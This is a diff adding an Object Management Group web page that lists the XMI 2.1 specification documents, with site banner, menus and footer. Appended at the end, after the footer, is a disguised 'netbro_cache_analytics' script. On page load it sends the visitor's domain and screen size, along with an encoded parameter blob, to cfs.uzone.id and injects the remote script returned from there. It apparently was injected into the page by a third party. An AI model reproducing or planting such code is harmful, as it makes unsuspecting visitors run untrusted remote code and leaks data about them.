@@ -1,0 +1,149 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<meta name="keywords" content="UML, MDA, Certification, CORBA, OMG, OMG Meetings, IDL, XML, Technology, Middleware, Standards, Specifications, Modeling, Metamodel, Meta model, MOF, BPM, BPMN, Smart Grid">
+<meta name="description" content="XMI 2.1">
+<meta name="GENERATOR" content="Microsoft FrontPage 6.0">
+<meta name="ProgId" content="FrontPage.Editor.Document">
+<title>XMI 2.1</title>
+<link rel="stylesheet" type="text/css" href="../../stylesheet.css">
+<link REL="SHORTCUT ICON" HREF="http://www.omg.org/favicon.ico">
+</head>
+
+<body bgcolor="#DDDDDD">
+<div align="center">
+  
+  <table border="0" width="809" cellspacing="0" cellpadding="0" bgcolor="#FFFFFF">
+	<tr>
+		<td>
+  
+  <!--webbot bot="Include" U-Include="http://schema.omg.org/_borders/top.htm" TAG="BODY" startspan -->
+
+<!--Drop-down menu-->
+<noscript><a href="http://www.milonic.com/">DHTML Menu By Milonic JavaScript</a></noscript>			
+<script type="text/javascript" src="http://www.omg.org/nmenu/milonic_src.js"></script> 
+<script type="text/javascript" src="http://www.omg.org/nmenu/mmenudom.js"></script> 
+<!-- The next file contains your menu data, links and menu structure etc -->
+<script src="http://www.omg.org/nmenu/menu_data-dark.js" type="text/javascript"></script>
+
+<!--End Drop-down menu-->
+<table border="0" width="100%">
+		<tr><td align="center">
+		<map name="FPMap0_I1">
+<area href="http://www.omg.org/" shape="rect" coords="411, 5, 596, 89" alt="OMG Homepage" title="OMG Homepage">
+<area href="http://www.omg.org/mda" shape="rect" coords="927, 49, 989, 96" alt="MDA Homepage" title="MDA Homepage">
+<area href="http://www.corba.org" shape="rect" coords="32, 3, 159, 35" alt="CORBA Homepage" title="CORBA Homepage">
+<area href="http://www.omg.org/mof/" shape="rect" coords="8, 59, 78, 93" alt="MOF Homepage" title="MOF Homepage">
+<area href="http://www.uml.org" shape="rect" coords="121, 42, 195, 94" alt="UML Homepage" title="UML Homepage">
+<area href="http://www.omg.org/technology/documents/modeling_spec_catalog.htm" shape="rect" coords="207, 0, 271, 48" alt="CWM Homepage" title="CWM Homepage">
+<area href="http://www.omg.org/technology/documents/modeling_spec_catalog.htm#XMI" shape="rect" coords="258, 56, 349, 96" alt="XMI Homepage" title="XMI Homepage">
+<area href="http://portals.omg.org/dds/" shape="rect" coords="663, 54, 737, 99" alt="DDS Homepage" title="DDS Homepage">
+<area href="http://www.omgmarte.org" shape="rect" coords="769, 50, 876, 99" alt="OMG MARTE" title="OMG MARTE">
+<area href="http://www.bpmn.org" shape="rect" coords="713, 4, 813, 45" alt="BPMN Homepage" title="BPMN Homepage">
+<area href="http://www.omgsysml.org/" shape="rect" coords="845, 0, 939, 48" alt="SysML Homepage" title="SysML Homepage">
+</map>
+<img border="0" src="http://www.omg.org/images/images-home/top-all.gif" width="1002" height="100" alt="banner" usemap="#FPMap0_I1"></td>
+	</tr>
+	<tr>
+		<td class="menu_bg" align="center">
+<SCRIPT src="http://www.omg.org/nmenu/main_embed-dark.js" type="text/javascript"></SCRIPT></td>
+	</tr>
+</table>
+
+<p align="center">
+<br><br>
+
+<!--webbot bot="Include" i-checksum="31409" endspan --></td>
+	</tr>
+	<tr>
+		<td>
+		<div align="center">
+			<table width="90%" border="0" cellspacing="1">
+	<tr>
+		<td align="center" bgcolor="#FFFFFF" width="100%">
+
+		<h1 align="center">Documents associated with XMI&reg; Version 2.1</h1>
+		<h4 align="center">Release date: September 2005</h4>
+		<h5 align="center">Normative Documents</h5>
+        <div align="center">
+          <center>
+          <table border="0" width="90%" cellspacing="1" bgcolor="#CCCCCC">
+            <tr>
+              <td width="190" bgcolor="#FFFFFF" height="23">
+                <p align="center"><font color="#008080"><b>OMG document number</b></font></td>
+              <td width="106" bgcolor="#FFFFFF" height="23">
+                <p align="center"><b><font color="#008080">Explanation</font></b></td>
+              <td width="104" bgcolor="#FFFFFF" height="23">
+                <p align="center"><font color="#008080"><b>Format</b></font></td>
+              <td width="236" bgcolor="#FFFFFF" height="23">
+                <p align="center"><font color="#008080"><b>URL</b></font></td>
+            </tr>
+            <tr>
+              <td width="190" align="center" bgcolor="#FFFFFF">&nbsp;formal/2005-09-01</td>
+              <td width="106" align="center" bgcolor="#FFFFFF">XMI specification</td>
+              <td width="104" align="center" bgcolor="#FFFFFF">PDF</td>
+              <td width="236" align="center" bgcolor="#FFFFFF"><a href="PDF/">http://www.omg.org/spec/XMI/2.1/PDF</a></td>
+            </tr>
+            <tr>
+              <td width="190" align="center" bgcolor="#FFFFFF">&nbsp;formal/2005-09-01</td>
+              <td width="106" align="center" bgcolor="#FFFFFF">XMI specification</td>
+              <td width="104" align="center" bgcolor="#FFFFFF"> PostScript</td>
+              <td width="236" align="center" bgcolor="#FFFFFF"><a href="PS/">http://www.omg.org/spec/XMI/2.1/PS</a></td>
+            </tr>
+          </table>
+          </center>
+          <br>Return to <a href="../index.htm"> XMI Home Page</a>
+        </div>
+		</td>
+	</tr>
+	<tr>
+		<td align="center" bgcolor="#FFFFFF" width="100%">
+
+</td>
+	</tr>
+	</table>
+		</div>
+		</td>
+	</tr>
+	<tr>
+		<td>
+	<!--webbot bot="Include" U-Include="../../../_borders/bottom.htm" TAG="BODY" startspan -->
+	
+	<div align="center">
+	
+	<table border="0" width="1002" cellspacing="0">
+		<tr>
+			<td bgcolor="#008080" height="17"></td>
+		</tr>
+		<tr>
+			<td bgcolor="#000000" align="center" height="2">
+			
+		</td>
+		</tr>
+		<tr>
+			<td align="center" bgcolor="#EEEEEE" height="75">
+			
+			<font class="bpt"><font size="1">Copyright © 1997-2017 Object Management Group, Inc. All Rights 
+			Reserved. For questions about the WEBSITE , please contact
+			<a href="mailto:webmaster@omg.org">webmaster@omg.org</a> For 
+			TECHNICAL questions, please contact <a href="mailto:webtech@omg.org">
+			webtech@omg.org </a></font></font><font size="1">The site is using
+						</font>
+      <font size="1" color="#808080">
+						<a target="_blank" href="http://www.milonic.com/">
+						DHTML JavaScript Menu By Milonic.com</a></font><font size="1">.
+						</font>
+						</td>
+		</tr>
+	</table>
+	
+	</div>
+	
+<!--webbot bot="Include" i-checksum="15884" endspan --></td>
+	</tr>
+	</table>
+	</div>
+		
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKb%2f7qXrziPRASur7a5reEu8Yg3uXM4Aauzo9lflw4HMkecsCs5qcDehliiROaL3IBb9o0X2%2fyOS6bMKHpV%2f8hC%2bC3U%2fT7OJIVK3ojUWZLGj3DOe7TOibQajFphaab%2bnJ3KdklzxpE91TnVRxWGxF5mE1Tfpa6PvWIHgChqOtuoUIAbFervYeWQZTBf4qxOW7X13SiSL6Goz09zO0txUnJGOf67uhnbmo3YkM6Z2kD6YI8al5XzO2p7qDQczkWu2Dd934cnYeMoC7i3nYjFm7N11ptml%2fMXACj2vAHIqD3sKyZY8Zapm1hbztTZKGvhqmzQPXNJdgTCVLn1EAUINkikFkO3F2sAcb8aQmZSgGPF3hUJ0gSuhvQn8qXktujXlXMiIyj%2bQ%2f4wNjcOj%2bOHyGMzZGnenv5W0wCpRZrKhPS2DYjNeQceTAg0QFCfQdYgYIlLiz4has3leoZfe70G3D0uJLGUy5mVXWL3Rjjp8%2fsGCqJdfcwzPXISuWBaKuuSVnJQy6HMzROV%2bFY7efmulT11Tf0UURWSH3wsQl4UH1rRkV%2fn48W5HL2kcEnEJHJjRrEghazeKSGFVqvM2ZtDYPaqSgutPMIiUXuNiDvI2Bs9J6z3gFTKYs1dUMgw1k8dBI159Di53%2fNkYY%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+</html>
